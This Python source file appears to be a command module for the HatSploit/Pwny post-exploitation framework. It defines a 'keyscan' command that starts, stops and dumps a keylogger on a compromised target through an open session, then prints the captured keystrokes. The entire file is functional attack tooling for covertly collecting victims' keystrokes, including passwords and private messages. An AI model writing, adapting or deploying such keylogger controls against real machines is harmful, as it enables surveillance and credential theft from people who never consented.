"""
This command requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from pwny.api import *
from pwny.types import *

from badges.cmd import Command

KEYSCAN_BASE = 11

KEYSCAN_START = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL)
KEYSCAN_STOP = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL + 1)
KEYSCAN_DUMP = tlv_custom_tag(API_CALL_STATIC, KEYSCAN_BASE, API_CALL + 2)

TLV_TYPE_KEYSCAN_DATA = tlv_custom_type(TLV_TYPE_STRING, KEYSCAN_BASE, API_TYPE)


class ExternalCommand(Command):
    def __init__(self):
        super().__init__({
            'Category': "gather",
            'Name': "keyscan",
            'Authors': [
                'EntySec - command developer',
            ],
            'Description': "Capture keystrokes on the target.",
            'MinArgs': 1,
            'Options': [
                (
                    ('action',),
                    {
                        'help': "Action: start, stop, or dump.",
                        'choices': ['start', 'stop', 'dump'],
                    }
                ),
            ]
        })

    def run(self, args):
        if args.action == 'start':
            result = self.session.send_command(tag=KEYSCAN_START)

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to start keylogger!")
                return

            self.print_success("Keylogger started.")

        elif args.action == 'stop':
            result = self.session.send_command(tag=KEYSCAN_STOP)

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Failed to stop keylogger!")
                return

            self.print_success("Keylogger stopped.")

        elif args.action == 'dump':
            result = self.session.send_command(tag=KEYSCAN_DUMP)

            if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
                self.print_error("Keylogger not running or dump failed!")
                return

            data = result.get_string(TLV_TYPE_KEYSCAN_DATA)
            if data:
                self.print_information(data)
            else:
                self.print_warning("No keystrokes captured yet.")
